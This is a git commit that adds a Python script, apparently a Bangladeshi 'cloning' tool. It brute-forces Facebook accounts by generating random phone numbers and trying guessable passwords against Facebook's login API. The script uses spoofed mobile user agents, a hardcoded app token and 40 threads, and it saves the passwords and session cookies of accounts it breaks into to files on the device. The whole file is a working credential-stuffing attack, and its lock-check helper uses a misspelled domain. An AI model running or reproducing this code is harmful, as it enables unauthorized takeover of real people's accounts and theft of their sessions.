23640a7e316e325f033691e253a3ba5697a85f9d
Mehedi Hasan <150955746+mehedihasan21sgs@users.noreply.github.com>
2024-02-23 13:24:36 +0600

    Add files via upload

---
+++ bb.py
@@ -0,0 +1,205 @@
+
+import os
+#os.system("pip uninstall requests -y")
+#os.system("pip install requests")
+from os import system as clr
+import random
+import string 
+from concurrent.futures import ThreadPoolExecutor as tred
+import requests
+from bs4 import BeautifulSoup as bxx
+import re
+import sys
+import uuid
+import json
+import platform,math,smtplib
+import platform
+import smtplib
+import math
+import httpx
+import os,base64,zlib,pip,urllib
+from os import path
+import requests,random,uuid,string,hashlib,json
+from os import path
+from urllib.request import urlopen
+import os,base64,zlib,pip,urllib,urllib3
+
+#print('\n\033[1;37m install modules...')
+
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        print('\n Installing missing modules ...')
+       # os.system('pip install requests futures==2 > /dev/null')
+       
+
+#________________COLOUR______________#
+A = '\x1b[1;97m' 
+R = '\x1b[38;5;196m'
+Y = '\033[1;33m'
+G = '\x1b[38;5;48m'
+B = '\x1b[38;5;8m'
+G1 = '\x1b[38;5;46m'
+G2 = '\x1b[38;5;47m'
+G3 = '\x1b[38;5;48m'
+G4 = '\x1b[38;5;49m'
+G5 = '\x1b[38;5;50m'
+X = '\33[1;34m'
+X1 = '\x1b[38;5;14m'
+X2 = '\x1b[38;5;123m'
+X3 = '\x1b[38;5;122m'
+X4 = '\x1b[38;5;86m'
+X5 = '\x1b[38;5;121m'
+S = '\x1b[1;96m'
+M = '\x1b[38;5;205m'
+N= '\x1b[38;5;82m'
+colours = random.choice([N,R,Y,G,S,X,M])
+oks=[]
+cps=[]
+cpx=[]
+cokix=[]
+loop=0
+
+#__________________[ LOGO ]__________________#
+logo=(f"""
+
+{colours} __                      ___   _ _    
+{colours}/ _\  /\  /\/\ /\/\   /\/___\ / | | __
+{colours}\ \  / /_/ / / \ \ \ / //  // | | |/ /
+{colours}_\ \/ __  /\ \_/ /\ V / \_//  | |   < 
+{colours}\__/\/ /_/  \___/  \_/\___/   |_|_|\_\       [{A}V.2.{colours}]
+{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+#________________USER-AGENT______________#
+def HUAWEI():
+    model=random.choice(["DUB-LX1","AGS2-L09","POT-LX1","DRA-LX2","POT-LX3","VOG-L29","EVR-N29","FIG-LX1","Kirin Treble","HUAWEI LUA-L21","ATU-L31","COL-L29","NAM-LX9","VOG-L29","JKM-LX1","RNE-L22"])
+    Anderson=random.choice(["10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
+    vir=str(random.choice(range(111111111,999999999)))
+    cho=str(random.choice(range(43,447)))
+    fb=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
+    FBAN=fb.split("|")[1]
+    platform=fb.split("|")[0]
+    ua="Dalvik/2.1.0 (Linux; U; Android "+Anderson+"; "+model+" Build/HUAWEILUA-L21) [FBAN/"+FBAN+";FBAV/"+cho+".0.0.1.116;FBPN/"+platform+";FBLC/cs_CZ;FBBV/"+vir+";FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/"+model+";FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.choice(range(1,4)))+".0,width="+str(random.choice(range(720,1500)))+",height="+str(random.choice(range(1500,2000)))+"};]"
+    return ua
+
+def clear():
+    clr('clear')
+    print(logo)
+
+def ALAX_ASIF():
+    clear()
+
+    print(f'{colours}[{A}1{colours}]{colours} RANDOM CLONING')
+    print(f'{colours}[{A}2{colours}]{colours} FACEBOOK PROFILE')
+    print(f'{colours}[{A}3{colours}]{colours} CONTACT WHATSAPP')
+    print(f'{colours}[{A}0{colours}]{colours} EXIT')
+    linex()
+    option=input(f'{colours}[{A}●{colours}]{colours} CHOICE {A}: {A}')
+    if option in ['01','1']:
+        BD_CLONING()
+    if option in ['02','2']:
+    	os.system('xdg-open https://www.facebook.com/Shuvo');time.sleep(1)
+    if option in ['03','3']:
+    	os.system('xdg-open https://wa.me/+8801963728400');time.sleep(1)
+    else:
+        exit(f'{colours}Thanks for using dear :)')
+
+def BD_CLONING():
+    user=[]
+    clear()
+    print(f'{colours}[{A}●{colours}]{colours} EXAMPLE {A}:{colours} 017 {A}● {colours}019 {A}● {colours}018 {A}● {colours}016')
+    linex()
+    code=input(f'{colours}[{A}●{colours}]{colours} CHOICE {A}: {A} ')
+    linex()
+    clear()
+    print(f'{colours}[{A}●{colours}]{colours} EXAMPLE {A}:{colours} 1000 {A}● {colours}3000 {A}● {colours}5000 {A}● {colours}10000')
+    linex()
+    limit=int(input(f'{colours}[{A}●{colours}]{colours} CHOICE {A}: {A} '))
+    linex()
+    cpy=input(f'{colours}[{A}●{colours}]{colours} CLONING SHOW CP ID [{A}Y{colours}/{A}N{colours}] {A}:{A} ')
+    if cpy in ['n','N','no','NO','2','02']:
+    	cpx.append(f'n')
+    else:cpx.append(f'y')
+    linex()
+    cokixx=input(f'{colours}[{A}●{colours}]{colours} CLONING SHOW COOKIE [{A}Y{colours}/{A}N{colours}] {A}:{A} ')
+    if cokixx in ['y','Y','yes','Yes','1']:
+    	cokix.append('y')
+    else:cokix.append('n')
+    clear()
+    for nmbr in range(limit):
+        nmp=''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with tred(max_workers=40) as Tara:
+        tl=str(len(user))
+        print(f'{colours}[{A}●{colours}]{colours} SIM CODE  {A}: {code}')
+        print(f'{colours}[{A}●{colours}]{colours} TOTAL ID {A}: {str(len(user))}')
+        print(f'{colours}[{A}●{colours}]{colours} FLIGHT MODE {colours}[{A}ON{A}-{A}OFF{colours}]')        
+        linex()
+        for psx in user:
+            ids=code+psx
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'57575751','57273200','59039200','sadiya','jannat','abir123','taniya']
+            Tara.submit(method_crack,ids,passlist)
+    linex()
+    print(f'{colours}[{A}●{colours}]{colours} CLONEING HAS BEEN COMPLETED')
+    print(f'{colours}[{A}●{colours}]{colours} TOTAL OK ID {A}:{colours} {str(len(oks))}')
+    input(f'{colours}[{A}●{colours}]{colours} PRESS ENTER TO BACK ')
+    ALAX_ASIF()
+
+def method_crack(ids,passlist):
+    global oks
+    global cps
+    global loop
+    try:
+        for pas in passlist:
+            sys.stdout.write(f'\r\r{colours}[{A}Shuvo{colours}]{A}--[%s]--{colours}[{A}OK{colours}]{A}--[%s]'%(loop,len(oks)))
+            sys.stdout.flush()
+            adid=str(uuid.uuid4())
+            device_id=str(uuid.uuid4())
+            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
+            header={'User-Agent': HUAWEI(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            url='https://api.facebook.com/method/auth.login'
+            reqx=requests.post(url,data=datax,headers=header).json()
+            if 'session_key' in reqx:
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                ckkx=lock_check(uid)
+                if ckkx =='LOCK':
+                    break
+                else:
+                    print(f'\r\r{A}Shuvo-OK{A}]{colours} {uid} ● {pas}')            
+                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    if 'y' in cokix:print(f'\r\r{colours}[{A}COOKIE{colours}]{G1} '+coki) 
+                    open('/sdcard/Shuvo- COOKIE.txt', 'a').write(coki+'\n')             
+                    print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+                    open('/sdcard/Shuvo-OK.txt','a').write(str(uid)+' | '+pas+'\n')
+                    oks.append(str(uid))
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                    if 'y' in cpx:print(f'\r\r{A}[{colours}Shuvo{A}]{colours} {ids} ● {pas}')
+                    open('/sdcard/Shuvo-CP.txt','a').write(ids+' ● '+pas+'\n')
+                    cps.append(ids)
+                    break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#------------------module--------------------#
+import requests
+from bs4 import BeautifulSoup as bxx
+#-------------------lock cheak---------------#
+def lock_check(uid):
+	sessionx=requests.Session()
+	urlx=f'https://www.facebok.com/p/{uid}'
+	req=bxx(sessionx.get(urlx).content,'html.parser')
+	tx=req.find('title').txt
+	if tx =='FACEBOOK':
+		return('LOCK')
+	else:
+		return('LIVE')          
+
+ALAX_ASIF()
